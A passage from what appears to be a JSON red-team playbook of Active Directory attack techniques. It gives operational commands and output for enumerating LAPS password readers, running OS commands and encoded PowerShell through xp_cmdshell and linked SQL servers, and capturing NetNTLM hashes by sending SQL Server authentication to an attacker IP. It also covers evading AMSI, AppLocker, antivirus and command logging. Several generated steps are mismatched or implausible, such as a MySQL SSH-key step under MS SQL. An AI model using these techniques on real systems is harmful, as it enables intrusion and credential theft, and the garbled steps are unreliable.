            "\n## [[PowerView]]\n### Get principals can read LAPS PW\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"LDAP://OU=Workstations,DC=edu,DC=evil,DC=corp\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and $_.ActiveDirectoryRights -like \"*ReadProperty*\" } | select ObjectDN, SecurityIdentifier\n\nObjectDN                                              SecurityIdentifier\n--------                                              ------------------\nOU=Workstations,DC=edu,DC=evil,DC=corp            S-1-5-21-3263068140-2042698922-2891547269-1125\nCN=wkstn1,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125\nCN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n[[PowerView#Convert SID]]"
        ],
        "tools": [
            "BloodHound",
            "PowerView"
        ],
        "steps": [
            {
                "id": "a67bcf34-2fd1-4198-84d0-e269ee1a1c16",
                "name": "Check LAPS Installation",
                "description": "Verify if the Local Administrator Password Solution (LAPS) client is installed on the machine. This is indicated by the presence of LAPS files in the installation directory.",
                "requirements": {},
                "results": [
                    "LAPS:INSTALLED"
                ]
            },
            {
                "id": "66023881-0d7f-4fdb-b8de-dbe6e036e426",
                "name": "List LAPS Files",
                "description": "List the files in the LAPS installation directory to confirm it is installed and view its components. The typical installation path is 'C:\\Program Files\\LAPS\\CSE'.",
                "requirements": {},
                "results": [
                    "LAPS:FILES_LISTED"
                ]
            },
            {
                "id": "9cabea47-dae6-473b-b834-5704beab3966",
                "name": "Check LAPS Group Policy Objects",
                "description": "Use PowerView to search for Group Policy Objects pertaining to LAPS. This helps to identify GPOs that may manage LAPS settings.",
                "requirements": {
                    "tool": "PowerView"
                },
                "results": [
                    "GPO:LAPS_FOUND"
                ]
            },
            {
                "id": "f7475b2a-07ac-4c73-9a99-158ef6bd6d75",
                "name": "Check LAPS Password Read Permissions",
                "description": "Use PowerView to retrieve the Active Directory permissions configured for LAPS. This uncovers which users/groups have access to read the LAPS password attribute.",
                "requirements": {
                    "tool": "PowerView"
                },
                "results": [
                    "PERMISSION:READ_LAPS_PASSWORD"
                ]
            },
            {
                "id": "bb065b7c-bb15-4695-bbc3-b78aca1a9a96",
                "name": "Search Computers with LAPS Information",
                "description": "Use PowerView to find computer objects in Active Directory that have the ms-Mcs-AdmPwdExpirationTime attribute set, which indicates they are managed by LAPS.",
                "requirements": {
                    "tool": "PowerView"
                },
                "results": [
                    "COMPUTER:LAPS_MANAGED"
                ]
            },
            {
                "id": "034b9a5e-1e7b-4d76-8bcb-da86e32709ec",
                "name": "Utilize BloodHound for LAPS Data",
                "description": "Employ BloodHound to visualize and analyze the relationships in Active Directory related to LAPS, determining which users can read the LAPS password.",
                "requirements": {
                    "tool": "BloodHound"
                },
                "results": [
                    "BLOODHOUND:LAPS_DATA_ANALYSIS"
                ]
            }
        ]
    },
    {
        "id": "2a227f4e-cd88-4b51-a66c-8f863d84266e",
        "name": "MS SQL Servers",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# MS SQL Servers\nMicrosoft SQL Server allows in addition to the obvious data theft opportunities also code execution, privilege escalation, lateral movement and persistence.\n\n[[PowerUpSQL]] is an excellent tool for enumerating and interacting with MS SQL Servers.\n-[[PowerUpSQL#Auto information gathering]]\n-[[PowerUpSQL#SQL Query]]\n\n\u26a0\ufe0f Use [[Pass-the-Hash]] to impersonate a user and then use [[PowerUpSQL]] to verify the connection:\n>powerpick Get-SQLConnectionTest -Instance \"sql.rto.local,1433\" | fl\n\n>powerpick Get-SQLQuery -Instance \"sql.rto.local,1433\" -Query \"select @@servername\"\n\n>Invoke-SQLOSCmd -Instance \"sql.rto.local,1433\" -Command \"whoami\" -RawResults\n\nOr use [[mssqlclient]] via [[Proxychains]] or [[HeidiSQL]] via [[Proxifier]] to query\n\n## Tools\n########\n########",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[HeidiSQL]]\nSQL client to work with MS SQL Servers",
            "\n## [[mssqlclient]]\n```bash\nproxychains python3 /usr/local/bin/mssqlclient.py -windows-auth EDU/john@10.10.1.20\n\nProxyChains-3.1 (http://proxychains.sf.net)\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n|S-chain|-<>-127.0.0.1:1080-<><>-10.10.1.20:1433-<><>-OK\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(SRV1): Line 1: Changed database context to 'master'.\n[*] INFO(SRV1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)\n[<>] Press help for extra shell commands\nSQL> select @@servername;\n\nSRV1\n```"
        ],
        "tools": [
            "HeidiSQL",
            "mssqlclient"
        ],
        "steps": [
            {
                "id": "fa4a1c58-80e5-4e35-b2ba-91d4b0b2eb88",
                "name": "Test SQL Connection",
                "description": "Use PowerUpSQL to test the SQL connection to the instance at 'sql.rto.local' on port 1433.",
                "requirements": {},
                "results": [
                    "SQL:CONNECTED"
                ]
            },
            {
                "id": "bbc25cf9-038f-4ffe-a6c8-db8bbc68c2b9",
                "name": "Retrieve SQL Server Name",
                "description": "Query the SQL Server for its name by executing 'select @@servername' using PowerUpSQL.",
                "requirements": {},
                "results": [
                    "SQL:SERVERNAME"
                ]
            },
            {
                "id": "1f27c73a-c5c4-42f6-80e1-e9595b907723",
                "name": "Execute WhoAmI Command",
                "description": "Execute the 'whoami' command on the SQL instance to retrieve the current context user.",
                "requirements": {},
                "results": [
                    "OS:USER"
                ]
            },
            {
                "id": "d16158be-41d0-4dc9-885c-b53790c03294",
                "name": "Run Command via mssqlclient",
                "description": "Use mssqlclient to connect to the SQL Server instance with Windows Authentication and execute a command.",
                "requirements": {
                    "tool": "mssqlclient",
                    "access": "With valid credentials for EDU/john"
                },
                "results": [
                    "SQL:COMMAND_EXECUTED"
                ]
            }
        ]
    },
    {
        "id": "e6614181-d170-4176-97e2-2444672d25c0",
        "name": "SQL Command Execution",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "The technique involves utilizing the xp_cmdshell stored procedure in Microsoft SQL Server to execute operating system commands, effectively allowing for command execution on the server.",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[PowerUpSQL]]\n### Command Execution\n```ps\nInvoke-SQLOSCmd -Instance \"srv1.edu.evil.corp,1433\" -Command \"whoami\" -RawResults\n\nedu\\svc_mssql\n```"
        ],
        "tools": [
            "PowerUpSQL"
        ],
        "steps": [
            {
                "id": "1e3cbffe-5f82-4cf4-bb30-5742f1750711",
                "name": "Check xp_cmdshell Status",
                "description": "Query the current status of the xp_cmdshell configuration in SQL Server to determine if it is enabled or disabled.",
                "requirements": {},
                "results": [
                    "CONFIG:DISABLED",
                    "CONFIG:ENABLED"
                ]
            },
            {
                "id": "3a1a0e02-dabe-4107-8c03-b7cfc0d05ebd",
                "name": "Enable Advanced Options",
                "description": "Enable advanced options in SQL Server to allow the modification of the xp_cmdshell configuration setting.",
                "requirements": {},
                "results": [
                    "CONFIG:ADVANCED_OPTIONS_ENABLED"
                ]
            },
            {
                "id": "b50aef8a-2f2e-4641-b5b5-1a4505ee7481",
                "name": "Enable xp_cmdshell",
                "description": "Set the xp_cmdshell configuration option to 1 to enable command execution via xp_cmdshell.",
                "requirements": {},
                "results": [
                    "CONFIG:xp_cmdshell_ENABLED"
                ]
            },
            {
                "id": "b653aa77-7ba2-41ab-9fb6-8e12d4c878d3",
                "name": "Execute Command via xp_cmdshell",
                "description": "Run the command 'whoami' through xp_cmdshell to test execution rights and obtain the context under which SQL Server is running.",
                "requirements": {},
                "results": [
                    "CRED:USER_CONTEXT"
                ]
            },
            {
                "id": "fc81762a-e14f-46c4-ad9c-e6dff1720237",
                "name": "Encode and Execute Payload",
                "description": "Create a powershell command, encode it to Base64, and execute it through xp_cmdshell to deploy a beacon or other payload.",
                "requirements": {},
                "results": [
                    "PAYLOAD:EXECUTED"
                ]
            }
        ]
    },
    {
        "id": "73975cbe-92d1-439d-bee7-6d7d22109679",
        "name": "SQL Lateral Movement",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# SQL Lateral Movement\nLinked Servers allows a database to access data from an external source.\n\n## Identify and test automatically\nUse [[PowerUpSQL#Crawl SQL Server Link]]\n\n## Test manually\n1. Discover links of the current instance:\n    >SELECT * FROM master..sysservers;\n\n2. Query this remote instance over the link using **OpenQuery**:  \n\u26a0\ufe0f Single and double quotes matter!\n    > SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'select @@servername');\n\n3. Check xp_cmdshell via link\nCheck MS SQL configuration via link\n    >SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');\n\n4. If **RPC Out** is enabled on the link (not default), then you can enable xpcmdshell using the following syntax:\n    >EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]\n\n    >EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]\n\n5. Exploit via link\n    >SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')\n\n    >SELECT * FROM OPENQUERY(\"sql1.evil.corp\", 'select * from openquery(\"sql01.evil.external\", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')\n\n\n## Tools\n########\n########",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerUpSQL"
        ],
        "steps": [
            {
                "id": "net-fece1b0d-f1af-483a-8a9c-c00e75cfb9c8",
                "name": "Discover Linked Servers",
                "description": "Query the SQL Server to discover linked servers configured on the current instance by executing `SELECT * FROM master..sysservers;`.",
                "requirements": {},
                "results": [
                    "LINKED_SERVER:NAME"
                ]
            },
            {
                "id": "f14cc78c-c7c2-4bf1-ba4c-beebd9d93f7e",
                "name": "Query Remote Instance",
                "description": "Execute a query on a remote linked server using `OPENQUERY` to retrieve the server name. This involves sending a command to the linked server with the syntax: `SELECT * FROM OPENQUERY(\"<linked_server>\", 'select @@servername');`",
                "requirements": {},
                "results": [
                    "REMOTE_INSTANCE:NAME"
                ]
            },
            {
                "id": "3b253373-d629-419d-b0f6-3cbfd27eeeeb",
                "name": "Check xp_cmdshell Configuration",
                "description": "Check the configuration of `xp_cmdshell` on the linked server by executing `SELECT * FROM OPENQUERY(\"<linked_server>\", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');`.",
                "requirements": {},
                "results": [
                    "XPCMDSHELL:CONFIGURED"
                ]
            },
            {
                "id": "7f8b0450-7df2-4cb4-803e-57eb0f0b8b2f",
                "name": "Enable xp_cmdshell",
                "description": "Use remote execution to enable `xp_cmdshell` if allowed via the link, by executing the commands `EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance];` followed by `EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance];`. It requires `RPC Out` to be enabled on the linked server.",
                "requirements": {},
                "results": [
                    "XPCMDSHELL:ENABLED"
                ]
            },
            {
                "id": "db2c288f-715e-4e62-b9f4-ad84693bab63",
                "name": "Exploit via OpenQuery",
                "description": "Execute a command using `xp_cmdshell` via the linked server, sending a command through `OPENQUERY` to run a PowerShell command. Example: `SELECT * FROM OPENQUERY(\"<linked_server>\", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')`.",
                "requirements": {},
                "results": [
                    "COMMAND:EXECUTED",
                    "XP_CMDSHELL:USAGE"
                ]
            }
        ]
    },
    {
        "id": "236428c7-ee37-4dd5-bea9-9a44ad665180",
        "name": "SQL NetNTLM Capture",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "Capture the NetNTLM hash of the principal using the MS SQL Service.",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[InveighZero]]\nWe can use [[InveighZero]] to listen to the incoming requests (this should be run as a local admin).\n1. [[InveighZero#Capture NetNTLM hash]]\n2. Run `xp_dirtree` to connect the sql server to your machine running [[InveighZero]]\n>EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1\n3. Receive hash on the attacking machine\n```beacon\n[+] [2022-05-14T15:33:49] TCP(445) SYN packet from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLMv2 captured for EDU\\svc_mssql from 10.10.1.20(SRV1):50323:\nsvc_mssql::EDU:[...snip...]\n```\n4. [[Hashcat#Cracking netntlmv2]]",
            "\n## [[smbserver]]\nYou may also use the WinDivert + rportfwd combo (shown on the [[NTLM Relaying#Windows - Cobalt Strike]]) with Impacket's `smbserver.py` to capture the NetNTLM hashes.\n```sh\npython3 /usr/local/bin/smbserver.py -smb2support pwn .\n\nImpacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (127.0.0.1,46894)\n[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'\n[*] AUTHENTICATE_MESSAGE (EDU\\svc_mssql,SRV1)\n[*] User SRV1\\svc_mssql authenticated successfully\n[*] svc_mssql::EDU:[...snip...]\n[*] Connecting Share(1:pwn)\n```"
        ],
        "tools": [
            "InveighZero",
            "smbserver"
        ],
        "steps": [
            {
                "id": "d2c11767-5025-4c92-afc7-c1fd14c34a5e",
                "name": "Setup InveighZero",
                "description": "Start InveighZero on the attacker's machine to listen for incoming NetNTLM authentication requests. This should be run with local admin privileges.",
                "requirements": {},
                "results": [
                    "LISTENER:ACTIVE"
                ]
            },
            {
                "id": "0b5c9ddc-4f46-4909-bc89-f8c3fdd07a12",
                "name": "Execute xp_dirtree",
                "description": "Run the SQL Server command EXEC xp_dirtree '\\\\<attacker-IP>\\pwn', 1, 1 to trigger the authentication process and capture the NetNTLM hash.",
                "requirements": {},
                "results": [
                    "TRIGGER:AUTH_REQUEST"
                ]
            },
            {
                "id": "7c7949db-857b-4239-b663-e5fbc7c65dbb",
                "name": "Capture NetNTLM hash",
                "description": "Once xp_dirtree is executed, InveighZero will capture the NetNTLM hash from the SQL Server's authentication request. This hash will display in the console logs.",
                "requirements": {},
                "results": [
                    "CRED:NTLM_HASH"
                ]
            },
            {
                "id": "e5c6fc61-653f-4eae-bdee-339d1df1c14c",
                "name": "Setup smbserver",
                "description": "Run smbserver.py to create an SMB server on the attacker's machine that can respond to authentication requests from the target SQL Server.",
                "requirements": {
                    "tool": "Impacket"
                },
                "results": [
                    "SMB_SERVER:ACTIVE"
                ]
            },
            {
                "id": "21e53767-1c51-46ef-9673-7ad54d30b761",
                "name": "Receive authentication message",
                "description": "Once smbserver is set up, wait to capture authentication messages from clients connecting, which will provide you with the NetNTLM hashes.",
                "requirements": {},
                "results": [
                    "CRED:NTLM_HASH"
                ]
            },
            {
                "id": "ccfba9c5-a9ec-4beb-b088-046c807bc688",
                "name": "Crack captured NetNTLM hash",
                "description": "Use Hashcat or another cracking tool to attempt to break the captured NetNTLM hash into plaintext credentials.",
                "requirements": {
                    "tool": "Hashcat"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "c94ea799-0a92-40e7-9642-0e4bb78dce49",
        "name": "SQL Privilege Escalation",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt",
            "SweetPotato"
        ],
        "steps": [
            {
                "id": "fa7b96b5-1c81-4530-92c6-ef6f9c89181d",
                "name": "Check Token Privileges",
                "description": "Execute the Seatbelt tool to check the token privileges for the SQL service account and confirm the presence of SeImpersonatePrivilege.",
                "requirements": {
                    "tool": "Seatbelt",
                    "access": "Admin access to execute Seatbelt"
                },
                "results": [
                    "TOKEN_PRIVILEGE:SeImpersonatePrivilege"
                ]
            },
            {
                "id": "4f0b7277-199f-4e82-af6b-f0752d1a0380",
                "name": "Create Authorized SSH Key",
                "description": "Run a SQL query to create a shell script that appends an authorized SSH key to the authorized_keys file for the Ubuntu user.",
                "requirements": {
                    "tool": "MySQL",
                    "access": "MySQL Client access with appropriate privileges"
                },
                "results": [
                    "FILE: /var/lib/mysql/come_in.sh",
                    "SSH_KEY:APPENDED"
                ]
            },
            {
                "id": "8a5c45a8-8d4c-4905-8fa9-b80e6f30f895",
                "name": "Man-in-the-Middle Setup",
                "description": "Setup a rogue service that impersonates a SYSTEM service to authenticate against your controlled service, exploiting the impersonation ability.",
                "requirements": {
                    "tool": "Custom Service",
                    "access": "Permission to create and run services"
                },
                "results": [
                    "IMPERSONATION:SUCCESS",
                    "AUTHENTICATION:CAPTURED"
                ]
            }
        ]
    },
    {
        "id": "85b22029-a8df-4e26-a6c2-89813cccfb3a",
        "name": "AMSI",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "`amsi.dll` is loaded into every process and checks the process for malicious signatures. Because it's loaded into the memory of each process, we can change its behaviour by overwriting instructions in memory.\n\n[[ThreadCheck]] can be used to check for AMSI detections.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ThreadCheck]]\n### Example\n> C:\\Users\\Rasta>ThreatCheck.exe -f Downloads\\Grunt.bin -e AMSI\n\n### Commands\n```cmd\nC:\\>ThreatCheck.exe --help\n  -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI\n  -f, --file      Analyze a file on disk\n  -u, --url       Analyze a file from a URL\n  --help          Display this help screen.\n  --version       Display version information.\n```"
        ],
        "tools": [
            "ThreadCheck"
        ],
        "steps": [
            {
                "id": "c23d9c86-a5f4-4b69-b624-c0cad470f3ea",
                "name": "Load AMSI and execute a test file",
                "description": "This step involves executing a test file that is expected to trigger AMSI. The objective is to observe whether AMSI detects any malicious patterns or signatures during the execution.",
                "requirements": {},
                "results": [
                    "AMSI:DETECTED",
                    "AMSI:NOT_DETECTED"
                ]
            },
            {
                "id": "7c615aad-f405-4a28-823e-2e9987f3c881",
                "name": "Check AMSI status using ThreadCheck",
                "description": "Use ThreadCheck to analyze the specified file for AMSI detection. This checks the file against the AMSI scanning engine and reports whether it is flagged as malicious or not.",
                "requirements": {
                    "tool": "ThreadCheck",
                    "file_path": "path/to/test/file"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:FAIL"
                ]
            },
            {
                "id": "f48d4db4-2bc0-45d6-b0e7-56f54bcd91be",
                "name": "Analyze output for AMSI bypass",
                "description": "Evaluate the results from the ThreadCheck command output to determine if any AMSI detection was bypassed, indicating a potential evasion technique.",
                "requirements": {},
                "results": [
                    "AMSI:BYPASS:SUCCESS",
                    "AMSI:BYPASS:FAILURE"
                ]
            },
            {
                "id": "ac6796c6-fd8e-4294-923d-f172206da237",
                "name": "Generate a report for findings",
                "description": "Compile a report that outlines the results of the AMSI testing, including whether the sample was detected by AMSI or if any efforts to bypass it were successful.",
                "requirements": {},
                "results": [
                    "REPORT:GENERATED",
                    "REPORT:DETECTED",
                    "REPORT:UNDETECTED"
                ]
            }
        ]
    },
    {
        "id": "19400de8-78eb-4982-b9b8-71b6d881f254",
        "name": "AppLocker",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# AppLocker\nAppLocker  executables, libraries and scripts that are on a system. AppLocker can restrict the execution based on rules defined for the following categories:\n* Executable\n* Windows Installer\n* Script\n* Packaged App\n* DLLs\n\nThese rules can have the following status:\n* enforced  \n* audit only\n* none\n\n**If enforced** everything within that category is blocked. Rules can then be added to allow principals to execute files. The rules themselves can be defined based on file attributes such as path, publisher or hash. AppLocker has a set of default allow rules such as, \"allow everyone to execute anything within `C:\\Windows\\*`\".\n![](/Images/Pasted%20image%2020220323165007.png)\nCustom rules can be applied to block especially [\"LOLBAS's\"](https://lolbas-project.github.corp/).\n\nBypassing AppLocker is based on the rules defined\n1.  Executing untrusted code via trusts LOLBAS's.\n2.  Finding writeable directories within \"trusted\" paths.\n3.  By default, AppLocker is not even applied to Administrators.\n\n\u2139\ufe0f By default `C:\\Windows` is a trusted location which is being exploited by Cobalt Strike's `jump psexec[64]`.\nUploading into `C:\\Windows` requires elevated privileges, but there are places like `C:\\Windows\\Tasks` that are writeable by standard users. These areas are useful in cases where you have access to a machine (e.g. in an assumed breach scenario), and need to break out of AppLocker to run post-ex tooling.\n\n\u26a0\ufe0fDLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": [
            {
                "id": "3b1e5b9b-f30f-4b7b-a819-b51f92610b62",
                "name": "Check AppLocker Policy Status",
                "description": "Retrieve the current AppLocker policy status to determine if it is enforced, in audit mode, or not applied. Check the Group Policy settings at `Computer Configuration -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker`.",
                "requirements": {},
                "results": [
                    "APPLOCKER:ENFORCED",
                    "APPLOCKER:AUDIT_ONLY",
                    "APPLOCKER:NONE"
                ]
            },
            {
                "id": "f96539da-967d-46bc-a2a6-0f25094d97e0",
                "name": "Identify Trusted Path Settings",
                "description": "Examine the `C:\\Windows\\*` and other trusted paths defined in AppLocker's rules to verify which locations are permitted to execute applications. Look for the default allow rule for `C:\\Windows`.",
                "requirements": {},
                "results": [
                    "TRUSTED_PATH:SYSTEM",
                    "TRUSTED_PATH:APPLICATIONS"
                ]
            },
            {
                "id": "ce636c6a-bb4c-4304-a0c9-999c25b8a79d",
                "name": "List Writeable Directories",
                "description": "Attempt to list directories within trusted paths that are writable by standard users, such as `C:\\Windows\\Tasks`. Use the command line to explore permissions of common directories.",
                "requirements": {},
                "results": [
                    "WRITEABLE_DIR:C:\\Windows\\Tasks"
                ]
            },
            {
                "id": "1b539fd4-7645-44e8-b794-e0b852b63375",
                "name": "Test Execution of LOLBAS",
                "description": "Execute a Living Off The Land Binary and Script (LOLBAS) to verify if it executes successfully under the current AppLocker policies without triggering blocks.",
                "requirements": {},
                "results": [
                    "LOLBAS:EXECUTE:PASS"
                ]
            },
            {
                "id": "4e33f8c7-f5cd-4b3d-9521-631ab90c4747",
                "name": "Analyze AppLocker Event Logs",
                "description": "Check the Windows Event Logs for AppLocker-related events, specifically in the `Applications and Services Logs -> Microsoft -> Windows -> AppLocker` section to review occurrences of blocked applications and any audit logs.",
                "requirements": {},
                "results": [
                    "EVENTLOG:APPBLOCKED",
                    "EVENTLOG:AUDITRECORD"
                ]
            }
        ]
    },
    {
        "id": "805e23f2-3c53-4916-8d67-b8242435cf42",
        "name": "Bypassing Antivirus (AV)",
        "phase": "10. Bypassing Defenses",
        "ttp": "TA0005",
        "external": false,
        "description": "Bypassing antivirus detection mechanisms.",
        "content": "# Bypassing Antivirus (AV)\n\n## Show Detected Threads\n`Get-MpThreatDetection` is a Windows Defender cmdlet that can also show detected threats.\n```beacon\nbeacon> remote-exec winrm dc-1 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources\n\nActionSuccess  : True\nDomainUser     : \nProcessName    : Unknown\nResources      : {file:_C:\\Windows\\v34gs462.exe, file:_\\\\dc-1\\ADMIN$\\v34gs462.exe}\nPSComputerName : dc-1\n\nActionSuccess  : True\nDomainUser     : EDU\\patrick\nProcessName    : C:\\Windows\\System32\\wsmprovhost.exe\nResources      : {amsi:_C:\\Windows\\System32\\wsmprovhost.exe}\nPSComputerName : dc-1\n```\n\n## Cobalt Strike Kits\n- [[Artifact Kit]]\n- [[Resource Kit]]\n- Elevate Kit\n- Persistence Kit\n- Mimikatz Kit\n- Sleep Mask Kit\n- Thread Stack Spoofer\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "f3e30c31-ac32-4199-b73f-778c9a899d8e",
                "name": "Check Windows Defender Threat Detections",
                "description": "Use the Get-MpThreatDetection cmdlet to list detected threats by Windows Defender, which can help identify how the antivirus is interacting with potential malicious activity.",
                "requirements": {},
                "results": [
                    "AV:THREAT_DETECTED",
                    "AV:ACTION_SUCCESS"
                ]
            },
            {
                "id": "d3521ff4-b378-4a35-af37-3f605518e79b",
                "name": "List Cobalt Strike Kits",
                "description": "Enumerate available Cobalt Strike kits that could be utilized to evade AV detection, helping in planning the exploitation path.",
                "requirements": {},
                "results": [
                    "COBALT:KITS_AVAILABLE"
                ]
            },
            {
                "id": "1a310e8e-b3c6-4671-bb68-b8f84eab38c9",
                "name": "Monitor for Anomalous Processes",
                "description": "Use tools or a script to monitor running processes on the host to identify signs of bypass attempts or anomalous behavior that could indicate a successful AV bypass.",
                "requirements": {},
                "results": [
                    "PROCESS:ANOMALOUS",
                    "PROCESS:SUSPICIOUS"
                ]
            }
        ]
    },
    {
        "id": "1cf73837-ecfa-4e7d-b73a-a690f195b196",
        "name": "Command Line Logging",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "Use SocksProxy to bypass command line logging.",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "d7046d84-e899-4cb0-b45e-2da5c65424e7",
                "name": "Install SocksProxy",
                "description": "Download and install SocksProxy to enable tunneling of network traffic. Make sure you have the appropriate permissions and that the installation directory is accessible.",
                "requirements": {
                    "permissions": "Admin"
                },
                "results": [
                    "SOCKS:INSTALLED"
                ]
            },
            {
                "id": "2d93fc8a-20af-4b13-acd2-88e4f78e848d",
                "name": "Configure SocksProxy",
                "description": "Set up SocksProxy configuration files to route traffic as needed. Typically, this involves modifying a config file located in the installation directory, such as `/etc/socksproxy.conf`.",
                "requirements": {
                    "permissions": "Write"
                },
                "results": [
                    "SOCKS:CONFIGURED"
                ]
            },
            {
                "id": "c70bcd95-7a52-48c6-8b38-038a974d35d0",
                "name": "Start SocksProxy service",
                "description": "Run SocksProxy to begin listening for incoming traffic. This can usually be done with a command like `socksproxy start` in the terminal or console.",
                "requirements": {
                    "permissions": "User"
                },
                "results": [
                    "SOCKS:RUNNING"
                ]
            },
            {
                "id": "9a1b8bf8-0b5a-4f31-9c64-3bb3d7a75479",
                "name": "Set environment variable for command line tools",
                "description": "Export nullified logging environment variables for routing the desired traffic through SocksProxy. Use commands like `export http_proxy=socks://127.0.0.1:1080` to direct traffic through the proxy.",
                "requirements": {},
                "results": [
                    "NETWORK:PROXY_SET"
                ]
            },
            {
                "id": "e5f74612-4ae9-44ac-866c-e13665ea3c55",
                "name": "Run Command Line Tool",
                "description": "Invoke any command-line tool or script that you wish to run without logging. Ensure it is configured to use the proxy so that logging does not capture the commands run.",
                "requirements": {},
                "results": [
                    "COMMAND:EXECUTED"
                ]
            }
        ]
    },
    {
        "id": "cafa8086-4901-44a0-b52e-5cc85c75be83",
        "name": "ETW",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers. ETW is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features.",
        "content": "Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers. ETW is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features.",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "c7e9b4c5-8e42-4cdc-a62e-d76e8dbed20a",
                "name": "Start ETW tracing for a specific provider",
                "description": "Use the 'logman' tool to create and start an ETW trace session for a specific provider, which can be identified by its GUID.",
                "requirements": {
                    "tool": "logman",
                    "access": "Administrator"
                },
                "results": [
                    "ETW:START",
                    "ETW:PROVIDER:[Provider_Name]"
                ]
            },
            {
                "id": "fe8a7c1b-5b1f-4b82-9c45-fedaa2f9eae1",
                "name": "Stop ETW tracing",
                "description": "Stop the currently running ETW trace session using the 'logman' command. This finalizes any logs and makes them available for analysis.",
                "requirements": {
                    "tool": "logman",
                    "access": "Administrator"
                },
                "results": [
                    "ETW:STOP",
                    "ETW:SESSION:[Session_Name]"
                ]
            },
            {
                "id": "e4bc4f39-cac5-4eec-b043-e5076dd7b8a0",
                "name": "Export ETW logs to a file",
                "description": "Export the captured ETW trace session to a specified output file format (such as .etl) for further analysis using 'tracelog'.",
                "requirements": {
                    "tool": "tracelog",
                    "access": "Administrator"
                },
                "results": [
                    "ETW:EXPORT",
                    "ETW:FILE:[Output_File_Path]"
                ]
            },
            {
                "id": "f6ce27a3-fd6a-46c5-9252-6de7bb349090",
                "name": "View ETW sessions",
                "description": "List all currently running ETW sessions using the 'logman' command, useful for verifying active trace sessions.",
                "requirements": {
                    "tool": "logman",
                    "access": "User"
                },
                "results": [
                    "ETW:LIST_SESSIONS"
                ]
            },
            {
                "id": "94381e3b-61b4-4f8e-908d-aed063b81e09",
                "name": "Enable specific ETW logging features",
